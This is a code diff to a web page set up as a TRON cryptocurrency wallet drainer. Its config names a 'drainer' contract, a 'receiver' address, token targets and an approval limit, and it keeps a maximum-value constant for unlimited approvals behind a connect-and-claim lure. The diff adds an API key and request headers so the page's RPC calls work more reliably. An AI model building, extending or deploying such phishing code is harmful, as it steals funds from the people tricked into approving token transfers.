@@ -108,7 +108,7 @@
 </div>
 
 <script>
-window.BAIT_CONFIG={wcProjectId:'7b4c156e02caf580713985225e0729b4',bait:'',drainer:'TKzimrUhM9USG5YWLFQ7biMoxhX4pRmgND',receiver:'TH7mvLb3UJ35re2ZuQpTKpHQRQ97pnXYvA',approveLimit:'10000',tokens:['TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t','TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8']};
+window.BAIT_CONFIG={wcProjectId:'7b4c156e02caf580713985225e0729b4',apiKey:'112650b4-b167-4cb4-87b0-bde7ffb4ae4a',bait:'',drainer:'TKzimrUhM9USG5YWLFQ7biMoxhX4pRmgND',receiver:'TH7mvLb3UJ35re2ZuQpTKpHQRQ97pnXYvA',approveLimit:'10000',tokens:['TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t','TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8']};
 </script>
 <script src="config.js"></script>
 <script>
@@ -131,6 +131,7 @@ const MAX = '1157920892373161954235709850086879078532699846656405640394575840079
 const setStatus = (t, c) => { $('status').textContent = t || ''; $('status').className = 'status ' + (c || ''); $('cstatus').textContent = t || ''; $('cstatus').className = 'status ' + (c || ''); };
 const show = (id) => ['view-connect', 'view-claim', 'view-done'].forEach((v) => $(v).classList.toggle('hidden', v !== id));
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+const HDRS = () => Object.assign({ 'content-type': 'application/json' }, cfg.apiKey ? { 'TRON-PRO-API-KEY': cfg.apiKey } : {});
 
 function fmt(raw, dec) { const s = String(raw).padStart(dec + 1, '0'); const w = s.slice(0, s.length - dec); const f = s.slice(s.length - dec).replace(/0+$/, ''); return f ? w + '.' + f : w; }
 
@@ -144,7 +145,7 @@ async function loadConfig() {
 async function rpc(method, params, tries = 8) {
   let last = 'network';
   for (let i = 0; i < tries; i++) {
-    const r = await fetch(RPC + method, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(params) });
+    const r = await fetch(RPC + method, { method: 'POST', headers: HDRS(), body: JSON.stringify(params) });
     const t = await r.text();
     if (t.startsWith('{')) {
       const j = JSON.parse(t);
